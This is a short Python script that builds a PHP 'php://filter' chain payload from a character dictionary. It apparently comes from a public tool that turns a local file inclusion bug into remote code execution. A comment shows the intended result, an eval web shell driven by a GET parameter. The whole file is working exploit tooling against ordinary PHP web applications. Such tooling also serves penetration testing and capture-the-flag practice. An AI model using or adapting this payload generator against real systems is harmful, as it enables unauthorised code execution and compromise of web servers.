import sys

if len(sys.argv)<2:
        print(f'python3 ./{sys.argv[0]} <base64_code>')
        exit()

# https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
file_to_use = "a.txt"

#<?php eval($_GET[1]);?>a
base64_payload = sys.argv[1]

# generate some garbage base64
filters = ""
filters += "convert.base64-encode/"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
# filters += "convert.iconv.UTF8.UTF7/"


for c in base64_payload[::-1]:
        filters += open('./res/'+c).read() + "/"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode/"
        filters += "convert.base64-encode/"
        # get rid of equal signs


filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

print(final_payload)
